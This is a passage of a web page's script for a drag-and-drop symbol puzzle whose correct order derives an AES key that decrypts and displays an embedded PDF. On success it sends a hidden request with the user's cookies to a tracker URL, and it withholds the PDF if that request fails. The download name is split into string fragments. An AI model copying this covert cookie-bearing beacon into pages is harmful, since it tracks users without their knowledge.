        const ivData = "IbjjSobUD92TqPoH";
        const list = document.getElementById('symbolList');
        let draggingItem = null;

        // Desktop Drag and Drop
        list.addEventListener('dragstart', e => { draggingItem = e.target; e.target.classList.add('dragging'); });
        list.addEventListener('dragend', e => { e.target.classList.remove('dragging'); attemptDecrypt(); });
        list.addEventListener('dragover', e => {
            e.preventDefault();
            const afterElement = getDragAfterElement(list, e.clientX, e.clientY);
            if (afterElement == null) list.appendChild(draggingItem);
            else list.insertBefore(draggingItem, afterElement);
        });

        // Mobile Touch Support
        list.addEventListener('touchmove', e => {
            e.preventDefault();
            const touch = e.touches[0];
            const item = document.elementFromPoint(touch.clientX, touch.clientY);
            if (item && item.parentNode === list && item !== draggingItem) {
                const afterElement = getDragAfterElement(list, touch.clientX, touch.clientY);
                if (afterElement == null) list.appendChild(draggingItem);
                else list.insertBefore(draggingItem, afterElement);
            }
        }, { passive: false });

        list.addEventListener('touchstart', e => {
            draggingItem = e.target;
            e.target.classList.add('dragging');
        });
        list.addEventListener('touchend', e => { e.target.classList.remove('dragging'); attemptDecrypt(); });

        function getDragAfterElement(container, x, y) {
            const draggableElements = [...container.querySelectorAll('li:not(.dragging)')];
            return draggableElements.reduce((closest, child) => {
                const box = child.getBoundingClientRect();
                const offsetX = x - box.left - box.width / 2;
                const offsetY = y - box.top - box.height / 2;
                // Simple distance check for better mobile wrapping support
                const distance = Math.sqrt(offsetX**2 + offsetY**2);
                if (x < box.right && y < box.bottom) {
                    if (distance < closest.distance) return { distance: distance, element: child };
                }
                return closest;
            }, { distance: Number.POSITIVE_INFINITY }).element;
        }

        async function attemptDecrypt() {
            const status = document.getElementById('status');
            const currentOrder = [...document.querySelectorAll('#symbolList li')].map(li => li.innerText).join('');
            status.innerText = "Decrypting...";
            status.style.color = "var(--primary)";
            status.style.display = 'block';

            try {
                const encoder = new TextEncoder();
                const keyHash = await crypto.subtle.digest("SHA-256", encoder.encode(currentOrder));
                const key = await crypto.subtle.importKey("raw", keyHash, { name: "AES-GCM" }, false, ["decrypt"]);

                const encrypted = Uint8Array.from(atob(encryptedData), c => c.charCodeAt(0));
                const iv = Uint8Array.from(atob(ivData), c => c.charCodeAt(0));

                const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, encrypted);

                try {
                    await fetch(document.getElementById('tracker').src + '/success', {credentials: 'include'});
                } catch(e) {
                    status.style.color = "red";
                    status.innerText = "[ " + currentOrder + " ] is correct, network connection fail. Please try again.";
                    return;
                }
                
                const blob = new Blob([decrypted], { type: 'application/pdf' });
                const url = URL.createObjectURL(blob);

                const downloadBtn = document.getElementById('downloadBtn');
                downloadBtn.style.display = 'block';
                downloadBtn.onclick = () => {
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = "y"+"ing"+"yu.pdf";
                    a.click();
                };

                const pdfContainer = document.getElementById('pdfContainer');
                pdfContainer.innerHTML = `<iframe src="${url}#navpanes=0&toolbar=0" width="100%" height="100%" style="border:none;"></iframe>`;
                pdfContainer.style.display = 'block';

                status.style.color = "var(--success)";
                status.style.display = 'none';
                status.innerText = "";
            } catch (e) {
                document.getElementById('downloadBtn').style.display = 'none';
                document.getElementById('pdfContainer').style.display = 'none';
                status.style.color = "red";
                status.innerText = "[ " + currentOrder + " ] is incorrect. Please try again.";
            }
        }
        window.addEventListener('load', attemptDecrypt);
    </script>
